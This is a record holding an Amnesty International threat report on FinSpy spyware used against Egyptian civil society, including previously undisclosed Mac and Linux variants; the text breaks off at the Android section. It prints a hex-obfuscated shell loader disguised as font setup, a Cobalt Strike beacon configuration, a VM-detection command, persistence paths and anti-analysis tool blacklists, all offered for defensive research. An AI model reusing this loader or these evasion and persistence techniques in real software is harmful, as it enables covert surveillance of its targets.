{
    "id": "c7093f61-9e84-4e67-94f1-1744ad9bdd69",
    "created_at": "2022-10-25T16:48:24.814262Z",
    "updated_at": "2025-03-27T02:16:08.485229Z",
    "deleted_at": null,
    "sha1_hash": "37b32bf2d55a94ac7991302ba9b19f19cd4ea4dc",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-09-28T05:27:00Z",
    "file_modification_date": "2020-09-28T05:27:00Z",
    "file_size": 1088906,
    "plain_text": "# German-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed\n\n**[amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)**\n\n## Summary:\n\nFinSpy is a commercial spyware suite produced by the Munich-based company FinFisher Gmbh. Since 2011 researchers have documented\nnumerous cases of targeting of Human Rights Defenders (HRDs) - including activists, journalists, and dissidents with the use of FinSpy in\n[many countries, including Bahrain, Ethiopia, UAE, and more. Because of this, Amnesty International’s Security Lab tracks FinSpy usage and](https://citizenlab.ca/2012/07/from-bahrain-with-love-finfishers-spy-kit-exposed/)\ndevelopment as part of our continuous monitoring of digital threats to Human Rights Defenders.\n[Amnesty International published a report in March 2019 describing phishing attacks targeting Egyptian human rights defenders and media](https://www.amnesty.org/en/latest/research/2019/03/phishing-attacks-using-third-party-applications-against-egyptian-civil-society-organizations/)\nand civil society organizations staff carried out by an attacker group known as “NilePhish”. While continuing research into this group’s\nactivity, we discovered it has distributed samples of FinSpy for Microsoft Windows through a fake Adobe Flash Player download website.\nAmnesty International has not documented human rights violations by NilePhish directly linked to FinFisher products.\nThrough additional technical investigations into this most recent variant, Amnesty’s Security Lab also discovered, exposed online by an\nunknown actor, new samples of FinSpy for Windows, Android, and previously undisclosed versions for Linux and MacOS computers.\nThis report provides technical information on these recent FinSpy samples in order to aid the cybersecurity research community in further\ninvestigations, enable cybersecurity vendors implement protection mechanisms against these newly discovered variants, and to raise\nawareness among HRDs of evolving digital attack techniques.\n\n## Introduction\n\nFinSpy is a full-fledged surveillance software suite, capable of intercepting communications, accessing private data, and recording audio and\nvideo, from the computer or mobile devices it is silently installed on. FinSpy is produced by Munich-based company FinFisher Gmbh and sold to\nlaw enforcement and government agencies around the world. According to media reports, when Egyptian protesters broke into the offices of the\nnow dissolved State Security Investigations Service, an intelligence body responsible for investigating security threats and notorious for\ncommitting grave human rights violations during Hosni Mubarak’s decades’ long rule, in 2011, they discovered contracts for the sale of FinSpy to\nEgyptian authorities. Since then, research groups such as Citizen Lab, at the University of Toronto, and Privacy International have discovered\n[FinSpy being used to target HRDs and civil society in many countries, including Bahrain, Turkey and Ethiopia. Because of this, Amnesty](https://citizenlab.ca/2012/07/from-bahrain-with-love-finfishers-spy-kit-exposed/)\nInternational’s Security Lab tracks FinSpy usage and development as part of our continuous monitoring of digital threats to HRDs.\n\nIn September 2019, Amnesty International discovered samples of FinFisher’s spyware distributed by malicious infrastructure tied to the attacker\ngroup commonly known as NilePhish. likely to be state sponsored. These attacks took place amid an unprecedented crackdown on independent\n[civil society and any critical voices. Over the years, numerous research reports, including by Amnesty International, detailed NilePhish’s](https://www.amnesty.org/en/documents/mde12/9107/2018/en/)\ncampaigns of targeting of Egyptian civil society organizations. Further technical investigation by Amnesty’s Security Lab led to the discovery of\nadditional previously unknown samples for Linux and Mac OS computers, provided with extensive interception capabilities.\n\nWith this report, Amnesty’s Security Lab shares new insights into the capabilities of the NilePhish attacker group, as well as provides detailed\nanalysis of newly discovered variants of FinSpy in order to enable cybersecurity researchers to further investigate and develop protection\nmechanisms. In addition, we hope to raise awareness among HRDs on the evolution of digital attack techniques and help address common\nmisconceptions that Linux and Mac computers are safer against spyware attacks.\n\n## NilePhish Fake Flash Player Update deliver FinFisher’s FinSpy\n\n[In March 2019 Amnesty International’s Security Lab warned Egyptian civil society organizations of a widespread campaign of phishing attacks](https://www.amnesty.org/en/latest/research/2019/03/phishing-attacks-using-third-party-applications-against-egyptian-civil-society-organizations/)\ntargeting human rights defenders, conducted by the so-called NilePhish attacker group. Following the publication, we continued monitoring the\nmalicious infrastructure operated by this group to identify any new attack campaigns.\n\nBy monitoring the group’s tools, techniques and attack infrastructure, in September 2019, Amnesty’s Security Lab identified the malicious website\n**flash.browserupdate[.]download connected to NilePhish. The website pretended to be a warning by Adobe Flash Player recommending**\ninstalling an update. Clicking anywhere on the page would download a recent version of Flash Player backdoored with FinSpy.\n\n\n-----\n\n_flash.browserupdate[.]download as displayed in September 2019_\n\nWhen we analyzed this Flash Player installer, we found it to be a FinSpy dropper (with hash\nf960144126748b971386731d35e41288336ad72a9da0c6b942287f397d57c600), designed to retrieve the final payload from the server\n**http://172.241.27[.]171/support/personal.asp. This payload would then be loaded into memory and executed. The server was offline at the**\n\n\n-----\n\ntime of analysis and we therefore did not manage to retrieve any additional payload.\n\nThe version of Flash Player (32.0.0.269) used to bundle the FinSpy downloader was released by Adobe in September 2019. The file had a creation\ndate of 20th September 2019. This suggests that backdoored binary was newly created around the time period in September 2019 when it was\nfirst uploaded to browserupdate[.]download.\n\n[It is worth noting that in 2017, ESET, a Slovak internet security company reported that FinFisher spyware was being delivered using network](https://www.welivesecurity.com/2017/09/21/new-finfisher-surveillance-campaigns/)\ninjection attacks in two (unnamed) countries. The research group Citizen Lab, located at the University of Toronto, later discovered evidence of\n[equipment used for similar network injection attacks in Egypt, suggesting it might have also been used for the distribution of FinFisher’s FinSpy.](https://citizenlab.ca/2018/03/bad-traffic-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/)\nWe cannot exclude that targets of this campaign were redirected to the browserupdate[.]download page through network injection, as similar\n[backdoored software have been used in network injection attacks in the past.](https://citizenlab.ca/2018/03/bad-traffic-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/)\n\n## Connections with NilePhish\n\nThe operators of this fake Flash Player download page created several other droppers which would download payloads from\nbrowserupdate[.]com. These included malicious Word documents containing macros, and a .NET program named clean.downloader.exe (with\n[hash 14658327efaa15275fb8718956ee97ebcad5bc80312a4f3182a3b10cd3dcf257), uploaded to the malware scanning service VirusTotal on 8th](https://www.virustotal.com/gui/file/14658327efaa15275fb8718956ee97ebcad5bc80312a4f3182a3b10cd3dcf257/details)\nOctober 2019. These additional droppers appeared to be under development and used for testing purposes: each downloaded a legitimate version\nof the tool Putty from https://flash.browserupdate[.]download/putty.exe.\n\nRevealingly, the .NET dropper included a PDB debug path from the developer’s computer:\n**C:\\Users\\shenno\\source\\repos\\clean.downloader\\clean.downloader\\obj\\Release\\clean.downloader.pdb.**\n\nThe username on the computer where this dropper was developed is “shenno”. This name we had previously found used by attackers behind the\n[NilePhish campaign we detailed in our March 2019 report. The Security Lab continued to monitor this group’s campaigns following our](https://www.amnesty.org/en/latest/research/2019/03/phishing-attacks-using-third-party-applications-against-egyptian-civil-society-organizations/)\npublication.\n\nIn February 2020, approximately 6 months after the initial FinSpy discovery, a new subdomain “files.browserupdate[.]download” was created\nwhich acted as reverse-proxy to a Cobalt Strike server hosted at 185.125.230.203 (more on this later). This IP is registered to a small Russian\nhosting company named Offshore Servers. Since 2018 we have observed NilePhish hosting a large part of their phishing infrastructure with\nOffshore Servers.\n\n_Link between the FinSpy sample and NilePhish_\n\n[In October 2019, cybersecurity firm CheckPoint released a follow-up report based on Amnesty International’s research which independently](https://research.checkpoint.com/2019/the-eye-on-the-nile/)\nconfirmed links between NilePhish, the Offshore Servers infrastructure and the operator named “shenno”. CheckPoint identified an Egyptian\nindividual who they linked to NilePhish and the “shenno” username and first revealed it to the public. At the time of our discovery of the fake\nFlash Player FinSpy dropper, “shenno” had not been disclosed yet.\n\nThe combination of nickname reuse, the use of the same hosting provider Offshore Servers, and the registration of additional NilePhish domains\nwith the same registrar in September 2019 ties this activity to NilePhish. These additional NilePhish domains include loglive.co (registered\nSeptember 11th), webmaillive.co (registered September 15th), and onlineaccount.live (registered October 2nd, 2019). Amnesty International has\nnot confirmed how NilePhish obtained FinSpy software.\n\n## NilePhish testing Cobalt Strike\n\nIn February 2020, a new subdomain files.browserupdate[.]download was created pointing to server at 5.135.174[.]213, serviced by French\n[hosting company OVH. This server was hosting an HTTP server with a valid TLS certificate on port 443. Using Censys we found that the server](https://www.censys.io/)\nhosted on Offshore Servers at 185.125.230[.]203 was also running a web server with the same TLS cert. Timing measurements showed that the\nOVH server was a reverse proxy for 185.125.230[.]203.\n\n\n-----\n\nProbing any URL which matched the URI checksum algorithm used by Cobalt Strike and Metasploit, would indeed serve Cobalt Strike payloads.\n\n[Cobalt Strike is a commercial penetration testing suite, that is sold for legitimate security audits of organizations. Since 2016, Cobalt Strike has](https://www.cobaltstrike.com/)\n[been identified as being abused by many attack groups such as the cyber-criminal Cobalt Group, and state-sponsored groups targeting](https://www.group-ib.com/blog/cobalt)\n[governments and individuals in Hong Kong and India. Cobalt Strike samples have been largely analysed publicly by several cyber-security](https://blog.malwarebytes.com/threat-analysis/2020/07/chinese-apt-group-targets-india-and-hong-kong-using-new-variant-of-mgbot-malware/)\ncompanies.\n\nAn obfuscated VBS script located at http://files.browserupdate[.]download/a downloads a Cobalt Strike payload from the same server on port\n443 and launches it.\n\nHere is the extracted configuration of the Cobalt Strike sample:\n\ndns : False\nssl : True\nport : 443\n.sleeptime : 5000\n.http-get.server.output :\n.jitter : 0\n.maxdns : 255\npublickey : 30819f300d06092a864886f70d010101050003818d0030818902818100f2b83af090d1a0c0a59e62ede880813384eccb6bff849d03d201a92f653a0747aa832afc7332a63627f45de2f31233f51a2436dfbe97cc0e800de38874c365ff5df768a3ee07a3fde3b239cec734f4116df8e8c1fe8b0\nf04a11c59ececd55222d3d26fd2a9be8dd01b299d38e6cd563609971ee710203010001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000000000000000000000\n.http-get.uri : files.browserupdate.download,/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books\n.user-agent : Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\n.http-post.uri : /N4215/adj/amzn.us.sr.aps\n.http-get.client :\n\nAccept: */*\nHost: www.amazon.comsession-token=\nskin=noskin;,csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996Cookie\n.http-post.client :\n\nAccept: */*\nContent-Type: text/xml\nX-Requested-With: XMLHttpRequest\nHost: www.amazon.com\nsz=160x600  oe=oe=ISO-8859-1;sn  s=3717  \"dc_ref=http%3A%2F%2Fwww.amazon.com\n.spawnto : fbf34aa48d6080bf8ef3eaff8ecf9a31\n.post-ex.spawnto_x86 : %windir%\\syswow64\\rundll32.exe\n.post-ex.spawnto_x64 : %windir%\\sysnative\\rundll32.exe\nunknown :\ncryptoscheme : 0\n.dns_idle : 0\n.dns_sleep : 0\n.http-get.verb : GET\n.http-post.verb : POST\nshouldChunkPosts : 0\nwatermark : 1\n.stage.cleanup : 0\nCFGCaution : 0\n\n[We provide signatures to detect Cobalt Strike and scripts to decode the payload and extract its configuration in our Github repository.](https://github.com/AmnestyTech/investigations)\n\n## FinSpy for Linux and Mac OS discovered\n\nIn the fall of 2019, while investigating recent versions of FinSpy following the discovery of its use by NilePhish, we identified additional FinSpy\nsamples through the malware research platform VirusTotal hosted at a server located at the IP address 158.69.105[.]207. We believe this server\nhas no relation to NilePhish and belongs to a different FinSpy operator.\n\n\n-----\n\n-----\n\n_Screenshot of the server webpage in October 2019_\n\nThis server hosted several samples linked from a publicly exposed webpage:\n\n_“Jabuka.app”: FinSpy for Mac OS, publicly disclosed here for the first time._\n_“PDF”: FinSpy for Linux, publicly disclosed here for the first time._\n_“wrar571.exe”: FinSpy downloader for Windows._\n_“WIFI.apk”: FinSpy for Android._\n\nAll these FinSpy samples were generated between April 2019 and November 2019.\n\n## FinSpy for Mac OS\n\nThe application bundle “Jakuba.app” is a copy of FinSpy for Mac OS, and it contains the following files:\n\nJabuka.app/Contents/Resources/data (with hash 37e749b79f4a24ead2868dffdb22c5034053615fed1166fdea05b4ca43b65c83) is an\nencrypted payload.\nJabuka.app/Contents/Info.plist (with hash b5304d70dfe832c5a830762f8abc5bc9c4c6431f8ecfe80a6ae37b9d4cb430fd) is a PList used for\npersistence.\nJabuka.app/Contents/MacOS/installer (with hash 80d6e71c54fb3d4a904637e4d56e108a8255036cbb4760493b142889e47b951f) is the\nlauncher.\n\n## Infection Chain\n\nThe FinSpy sample for MacOS uses a quite complex chain to infect the system, and the developers took measures to complicate its analysis. All the\n[binaries are obfuscated with the open source LLVM-obfuscator developed by a research team in 2013.](https://github.com/obfuscator-llvm/obfuscator)\n\n\n-----\n\nThe first stage is doing some checks to detect if the spyware is running in a Virtual Machine:\n\n- system_profiler SPUSBDataType | egrep -i \"Manufacturer: (parallels|vmware|virtualbox)\"\n\nIf it is not, it then decrypts, by XOR’ing with the string “NSString”, a Zip archive at the path /tmp/arch.zip and unpacks it to\n_/tmp/org.logind.ctp.archive. This archive contains the installer, the main cyload, but also binaries for privilege escalation:_\n\n_[helper: exploits a bug in Mac OS < 9 fixed in 2013 or 2014.](https://www.exploit-db.com/exploits/36739)_\n_[helper2: Python exploit for CVE-2015-5889.](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5889)_\n\nThis first stage uses the exploits to get root access. If none of them work, it will ask the user to grant root permissions to launch the next stage\ninstaller.\n\nThe installer (/tmp/org.logind.ctp.archive/installer) oversees installing the spyware in the system by:\n\n1. Copying all the plugins and configuration files to /Library/Frameworks/Storage.framework.\n2. Copying the launcher to /private/etc/logind.\n[3. Installing persistence by creating a logind.pslist file in /System/Library/LaunchAgents/ (T1543.001).](https://attack.mitre.org/techniques/T1543/001/)\n\n## A modular framework\n\nFinSpy for Mac OS, and similarly its Linux counterpart, follow a modular design. The launcher logind only instantiates the core component\n_dataPkg, which oversees communications with the Command and Control server (C&C), and decrypting/launching modules when needed. The_\nmodules are encrypted with the AES algorithm and compressed with the aplib compression library. The AES key is stored in the binary, but the IV\nis stored in each configuration file along with a MD5 hash of the final decompressed file.\n\nHere is the list of modules available in this version of the spyware, although additional references in the code suggest additional modules might\nexist but were not available in this distribution:\n\n\nFile\nname\n\n\nModule Name Description\n\n\n02 FSMain List files.\n\n\n-----\n\n04 CL Executes shell commands.\n\n05 Sch Scheduling.\n\n10 A Audio recording.\n\n12 IO Keylogger.\n\n16 FSCF Recording of modified files using File System Events API.\n\n17 FSAF Recording of accessed files.\n\n19 FSDF Recording of deleted files.\n\n22 MCMain Keylogger for virtual keyboards.\n\n\n23 CW, LSC,\nRSC\n\n\nCamera recording\n\n\n24 SM Screen recording.\n\n27 E Email stealer: it installs a malicious add-on to Apple Mail and Thunderbird which sends emails to a pipe for FinSpy\nto collect.\n\n28 W Collect information about Wi-Fi networks.\n\n29 RM List files on remote devices.\n\n7f Handles cryptography for C&C communications.\n\n## Command & Control Communications\n\nThe spyware communicates with the Command & Control (C&C) server using HTTP POST requests. The data sent to the server is encrypted using\nfunctions provided by the 7F module, compressed using a custom compressor and base64 encoded. All requests are made with a Content-Type\nchosen randomly from following list:\n\napplication/pdf\napplication/zip\napplication/gzip\nimage/gif\nimage/jpeg\nimage/png\nimage/tiff\ntext/html\ntext/plain\n\n## Configuration\n\nEach module is provided with its own configuration file. These files are encoded using a Type Length Value format in a different order (Size, Type,\nValue). The type serves both as an identifier and a field type, the lowest nibble representing the type of data. Most types identified fit the TLVs\n[listed in the FinSpy Android analysis published by the Chaos Computer Club in 2019.](https://github.com/devio/FinSpy-Tools/blob/master/Android/finspyCfgParse.py)\n\nHere is the extracted configuration of the core module:\n\n{\n\"TlvTypeTrojanID\": \"Jabuka\",\n\n\"0x80ab40\": 0,\n\"0x80aa40\": 0,\n\"TlvTypeEncryption\": \"GZP&OYq0S[AJ\\\\D\\u000e\\\\*^\\\"L@}C\",\n\"TlvTypeConfigTargetID\": \"Jabuka\",\n\"TlvTypeConfigAutoRemovalIfNoProxy\": 168,\n\"TlvTypeBlackWhiteListingMode\": 0,\n\"TlvTypeTrojanMaxInfections\": 9,\n\n\"TlvTypeTargetUID\": 0\n\n\n-----\n\n\"TlvTypeBlackListEntry\": [\n{\n\"category\": \"Monitoring\",\n\"list\": [\n\"taskmgr\",\n\"Windows Task Manager\",\n\"AccessEnum\",\n\"AccessEnum\",\n\"ADExplorer\",\n\"Active Directory Explorer\",\n\"ADInsight\",\n\"Insight for Active Directory\",\n\"Autologon\",\n\"Autologon\",\n\"autoruns\",\n\"Autoruns\",\n\"Bginfo\",\n\"BGInfo\",\n\"Cacheset\",\n\"Cacheset\",\n\"Dbgview\",\n\"Debug View\",\n\"Desktops\",\n\"Desktops\",\n\"disk2vhd\",\n\"Disk2vhd\",\n\"Diskmon\",\n\"Disk Monitor\",\n\"DiskView\",\n\"LoadOrd\",\n\"LoadOrder\",\n\"pagedfrg\",\n\"System File Defragmenter\",\n\"procexp\",\n\"Process Explorer\",\n\"Procmon\",\n\"Process Monitor\",\n\"RootkitRevealer\",\n\"ShareEnum\",\n\"ShellRunas\",\n\"Tcpview\",\n\"TCPView\",\n\"vmmap\",\n\"VMMap\",\n\"Winobj\",\n\"ZoomIt\"\n]\n},\n{\n\"category\": \"Sniffer\",\n\"list\": [\n\"wireshark\",\n\"The Wireshark Network Analyzer\",\n\"TCPDump\",\n\"Tcpview\",\n\"NetstatViewer\",\n\"Netstat Viewer\",\n\"NetPryer\",\n\"Ultra Network Sniffer\"\n]\n},\n{\n\"category\": \"Debugger\",\n\"list\": [\n\"OllyDbg\",\n\"idag\",\n\"The interactive disassembler\",\n\"WinDbg\"\n]\n}\n],\n\"TlvTypeWhiteListEntry\": [\n{\n\"category\": \"Browser\",\n\"list\": [\n\"firefox\",\n\"Mozilla Firefox\",\n\"iexplore\",\n\"Windows Internet Explorer\",\n\"opera\",\n\"chrome\"\n\n]\n\n\n-----\n\n},\n{\n\"category\": \"Messenger\",\n\"list\": [\n\"icq\",\n\"ICQ\",\n\"aim6\",\n\"AIM\",\n\"Skype\",\n\"Ypager\",\n\"Yahoo Messenger\",\n\"pidgin\",\n\"Buddy List\",\n\"trillian\",\n\"Trillian\",\n\"googletalk\",\n\"google Talk\"\n]\n},\n{\n\"category\": \"E - Mail\",\n\"list\": [\n\"OUTLOOK\",\n\"Microsoft Outlook\",\n\"msimn\",\n\"Outlook Express\",\n\"thunderbird\",\n\"Mozilla Thunderbird\",\n\"WinMail\",\n\"Windows Mail\",\n\"thebat\",\n\"The Bat!\"\n]\n},\n{\n\"category\": \"FileSharing\",\n\"list\": [\n\"bittorrent\",\n\"Bit Torrent\",\n\"uTorrent\",\n\"µTorrent\",\n\"emule\",\n\"eMule\",\n\"edonkey2000\",\n\"eDonkey\",\n\"kazaa\",\n\"Kazaa\",\n\"FrostWire\",\n\"LimeWire\"\n]\n},\n{\n\"category\": \"VoIP\",\n\"list\": [\n\"CGStarter\",\n\"X-Lite\",\n\"Gizmo5\",\n\"Mercuro\",\n\"Mercuro IMS Client\",\n\"ts3client_win32\",\n\"TeamSpeak 3\",\n\"Zfone\",\n\"Zfone Control Panel\"\n]\n}\n],\n\"TlvTypeConfigTargetPort\": 443,\n\"TlvTypeRequestID\": 0,\n\"0x804140\": 2048,\n\"TlvTypeVersion\": 0,\n\"TlvTypeUserID\": 1000,\n\"TlvTypeConfigAutoRemovalDateTime\": \"0000000000000000\",\n\"TlvTypeTrojanUID\": 232069579,\n\"TlvTypeConfigTargetProxy\": [\n\"185.25.50.[REDACTED]\",\n\"103.11.67.[REDACTED]\"\n],\n\"TlvTypeConfigFileTransferSpeed\": 1024,\n\"0x807c30\": 0,\n\"TlvTypeConfigTargetHeartbeatInterval\": 60000,\n\"TlvTypeConfigActiveHiding\": 0\n}\n\n\n-----\n\n[You can find code to extract configuration from FinSpy samples on our Github repository.](https://github.com/AmnestyTech/investigations)\n\n## Timeline\n\nThe information from the PSList file contains some metadata indicating that the development could have started on OS X 10.9, which was\nreleased in October 2013. But the spyware was very likely packaged for use in November 2019 as most of the files in the Zip archive were last\nmodified in November 2019. Here is an extract of the archive information:\n\nDate Time Attr Size Compressed Name\n------------------- ----- ------------ ------------ -----------------------2019-11-20 12:48:29 D.... 0 0 org.logind.ctp.archive\n2019-11-20 12:48:29 ....A 30196 10420 org.logind.ctp.archive/helper\n2019-11-20 12:48:29 ....A 975 540 org.logind.ctp.archive/helper2\n2019-11-20 12:48:29 ....A 63164 21452 org.logind.ctp.archive/installer\n2019-11-20 12:48:29 ....A 34264 12137 org.logind.ctp.archive/logind\n2019-11-20 12:48:29 ....A 431 267 org.logind.ctp.archive/logind.plist\n2019-11-20 12:48:29 D.... 0 0 org.logind.ctp.archive/storage.framework\n2019-11-20 12:48:29 D.... 0 0 org.logind.ctp.archive/storage.framework/Contents\n2019-04-25 15:35:02 ....A 1286 477 org.logind.ctp.archive/storage.framework/Contents/Info.plist\n2019-04-25 15:35:02 ....A 8 8 org.logind.ctp.archive/storage.framework/Contents/PkgInfo\n2019-11-20 12:48:29 D.... 0 0 org.logind.ctp.archive/storage.framework/Contents/MacOS\n...\n\n## Related sample\n\nAn additional FinSpy Mac OS sample with name “caglayan-macos.dmg” was found on Virus Total:\n[4f3003dd2ed8dcb68133f95c14e28b168bd0f52e5ae9842f528d3f7866495cea. This sample was created in February 2018 according to the zip files](https://www.virustotal.com/gui/file/4f3003dd2ed8dcb68133f95c14e28b168bd0f52e5ae9842f528d3f7866495cea/detection)\ntimestamp.\n\n## FinSpy for Linux\n\nThe FinSpy Linux was exposed on the server 158.69.105[.]207 in November 2019 as a file named “PDF” with hash\n1e9162cd0941557304a6a097dfaadf59f90bc8bbaa9879afe67b5ce0d1514be8. The Linux payload is very similar to the Mac OS version described\nabove, which suggests a potential shared codebase. However, the launchers and the infection chain are adapted to work on Linux systems.\n\n## Infection Chain\n\nThe “PDF” file obtained from the server is a short script containing encoded binaries for Linux 32bit and 64bit. It extracts the binary for the\nrelevant architecture in /tmp/udev2 and executes it. Like its Mac OS counterpart, FinSpy for Linux is also obfuscated using LLVM-Obfuscator.\n\n\n-----\n\n-----\n\nThe udev2 installer then checks that the system is not a virtual machine, extracts files from itself and stores them in a hidden folder in the user’s\nhome, such as at ~/.cache/.cfg or ~/.local/.apps. Among the files extracted, are a first stage payload called crond and encrypted modules named\nwith a hexadecimal number (such as 02) with their configuration in .dat extension, such as 02C.dat. In order to maintain persistence, an\nobfuscated script is added to the following files:\n\n_~/.profile_\n_~/.profile1_\n_~/.bash_profile_\n_~/.bash_profile1_\n_~/.kde/Autostart/udev2.sh_\n_~/.kde4/Autostart/udev2.sh_\n_~/.kde/Autostart_\n_~/.kde4/Autostart_\n\nThe script is disguised as dealing with system fonts, but it executes FinSpy’s first stage:\n\nif [ ! -n \"$CS_FONT\" ]; then\n# Load fonts by id\nCS_FONT_RID=\"2F686F6D652F757365722F2E63616368652F2E636667\"\nCS_FONT_ID=\"2E2F63726F6E64\"\nCS_FONT_COL=\"6364\"\nCS_FONT_COLF=`echo ${CS_FONT_COL} |sed 's/../& /g' |sed 's/ / p /g' |awk '{print \"16i \"$0}'|dc 2>/dev/null|awk '{printf(\"%c\",$0)}'`\nCS_FONT_SID=`echo ${CS_FONT_RID} |sed 's/../& /g' |sed 's/ / p /g' |awk '{print \"16i \"$0}'|dc 2>/dev/null|awk '{printf(\"%c\",$0)}'`\nCS_FONT_LOAD=`echo ${CS_FONT_ID} |sed 's/../& /g' |sed 's/ / p /g' |awk '{print \"16i \"$0}'|dc 2>/dev/null|awk '{printf(\"%c\",$0)}'`\nif [ ! -n \"$CS_FONT_COLF\" ]; then\nCS_FONT_COLF=$(for i in `echo ${CS_FONT_COL} |sed 's/../& /g'`; do echo \"000000 $i\" | xxd -r; done)\nCS_FONT_SID=$(for i in `echo ${CS_FONT_RID} |sed 's/../& /g'`; do echo \"000000 $i\" | xxd -r; done)\nCS_FONT_LOAD=$(for i in `echo ${CS_FONT_ID} |sed 's/../& /g'`; do echo \"000000 $i\" | xxd -r; done)\nfi\n${CS_FONT_COLF} ${CS_FONT_SID} && ${CS_FONT_LOAD} > /dev/null 2>&1 && ${CS_FONT_COLF} - > /dev/null 2>&1\nunset CS_FONT_ID\nunset CS_FONT_COLF\nunset CS_FONT_SID\nunset CS_FONT_LOAD\nfi\n\n\n-----\n\nBy converting the hexadecimal values embedded, the script eventually builds the following command and executes the FinSpy launcher:\n\n_cd /home/user/.cache/.cfg && ./crond > /dev/null 2>&1 && cd - > /dev/null 2>&1_\n\nThe installer finally launches the crond first stage binary copied in the installation folder. This crond binary only performs several checks (mutex\nin /tmp/.X11.lock, check if the process is debugged using ptrace), then decrypts and decodes the core module 80.so to run it in memory.\n\n## Modules\n\nThe modules available in the Linux sample are almost identical to the MacOS sample. The binaries are stored encrypted and obfuscated too, with\na slightly different format, the AES Initialization vector being stored within the core module binary instead of in the encrypted module files.\n\nThe modules available are exactly the list of modules in the MacOS sample with the addition of the module 14, which is responsible to extract data\nand record conversations from Skype.\n\n## Configuration\n\nThe configuration of the different modules is stored in .dat files with the same encoding scheme as the MacOS sample. Here is the decoded\nconfiguration for the core module:\n\n{\n\"TlvTypeTrojanID\": \"PDF\",\n\"0x80ab40\": 2774182400,\n\"0x80aa40\": 0,\n\"TlvTypeEncryption\": \"B-P&=YwCS[DJ\\\\3\\u000e)^^'@@\\b3\",\n\"TlvTypeConfigTargetID\": \"PDF\",\n\"TlvTypeConfigAutoRemovalIfNoProxy\": 168,\n\"TlvTypeTrojanMaxInfections\": 9,\n\"TlvTypeTargetUID\": 0,\n\"TlvTypeBlackListEntry\": [\n{\n\"category\": \"Monitoring\",\n\"list\": [\n\"taskmgr\",\n\"Windows Task Manager\",\n\"AccessEnum\",\n\"AccessEnum\",\n\"ADExplorer\",\n\"Active Directory Explorer\",\n\"ADInsight\",\n\"Insight for Active Directory\",\n\"Autologon\",\n\"Autologon\",\n\"autoruns\",\n\"Autoruns\",\n\"Bginfo\",\n\"BGInfo\",\n\"Cacheset\",\n\"Cacheset\",\n\"Dbgview\",\n\"Debug View\",\n\"Desktops\",\n\"Desktops\",\n\"disk2vhd\",\n\"Disk2vhd\",\n\"Diskmon\",\n\"Disk Monitor\",\n\"DiskView\",\n\"LoadOrd\",\n\"LoadOrder\",\n\"pagedfrg\",\n\"System File Defragmenter\",\n\"procexp\",\n\"Process Explorer\",\n\"Procmon\",\n\"Process Monitor\",\n\"RootkitRevealer\",\n\"ShareEnum\",\n\"ShellRunas\",\n\"Tcpview\",\n\"TCPView\",\n\"vmmap\",\n\"VMMap\",\n\"Winobj\",\n\"ZoomIt\"\n]\n},\n{\n\n\"category\": \"Sniffer\"\n\n\n-----\n\n\"list\": [\n\"wireshark\",\n\"The Wireshark Network Analyzer\",\n\"TCPDump\",\n\"Tcpview\",\n\"NetstatViewer\",\n\"Netstat Viewer\",\n\"NetPryer\",\n\"Ultra Network Sniffer\"\n]\n},\n{\n\"category\": \"Debugger\",\n\"list\": [\n\"OllyDbg\",\n\"idag\",\n\"The interactive disassembler\",\n\"WinDbg\"\n]\n}\n],\n\"TlvTypeWhiteListEntry\": [\n{\n\"category\": \"Browser\",\n\"list\": [\n\"firefox\",\n\"Mozilla Firefox\",\n\"iexplore\",\n\"Windows Internet Explorer\",\n\"opera\",\n\"chrome\"\n]\n},\n{\n\"category\": \"Messenger\",\n\"list\": [\n\"icq\",\n\"ICQ\",\n\"aim6\",\n\"AIM\",\n\"Skype\",\n\"Ypager\",\n\"Yahoo Messenger\",\n\"pidgin\",\n\"Buddy List\",\n\"trillian\",\n\"Trillian\",\n\"googletalk\",\n\"google Talk\"\n]\n},\n{\n\"category\": \"E - Mail\",\n\"list\": [\n\"OUTLOOK\",\n\"Microsoft Outlook\",\n\"msimn\",\n\"Outlook Express\",\n\"thunderbird\",\n\"Mozilla Thunderbird\",\n\"WinMail\",\n\"Windows Mail\",\n\"thebat\",\n\"The Bat!\"\n]\n},\n{\n\"category\": \"FileSharing\",\n\"list\": [\n\"bittorrent\",\n\"Bit Torrent\",\n\"uTorrent\",\n\"µTorrent\",\n\"emule\",\n\"eMule\",\n\"edonkey2000\",\n\"eDonkey\",\n\"kazaa\",\n\"Kazaa\",\n\"FrostWire\",\n\"LimeWire\"\n\n]\n\n\n-----\n\n},\n{\n\"category\": \"VoIP\",\n\"list\": [\n\"CGStarter\",\n\"X-Lite\",\n\"Gizmo5\",\n\"Mercuro\",\n\"Mercuro IMS Client\",\n\"ts3client_win32\",\n\"TeamSpeak 3\",\n\"Zfone\",\n\"Zfone Control Panel\"\n]\n}\n],\n\"TlvTypeConfigTargetPort\": 443,\n\"TlvTypeRequestID\": 0,\n\"0x804140\": 2048,\n\"TlvTypeVersion\": 0,\n\"TlvTypeUserID\": 1000,\n\"TlvTypeConfigAutoRemovalDateTime\": \"0000000000000000\",\n\"TlvTypeTrojanUID\": 229643403,\n\"TlvTypeConfigTargetProxy\": [\n\"185.25.50.[REDACTED]\",\n\"103.11.67.[REDACTED]\"\n],\n\"TlvTypeConfigFileTransferSpeed\": 1024,\n\"0x807c30\": 0,\n\"TlvTypeConfigTargetHeartbeatInterval\": 40000,\n\"TlvTypeConfigActiveHiding\": 0\n}\n\n## Related Sample\n\nAnother Linux Sample was found on VirusTotal during the investigation\n[bd1b8bc046dbf19f8c9bbf9398fdbc47c777e1d9e6d9ff1787ada05ed75c1b12. It was first uploaded on VirusTotal in 2014.](https://www.virustotal.com/gui/file/bd1b8bc046dbf19f8c9bbf9398fdbc47c777e1d9e6d9ff1787ada05ed75c1b12/detection)\n\n## FinSpy for Android\n\nThe file “WIFI.apk” identified on 158.69.105.207 (sha256: 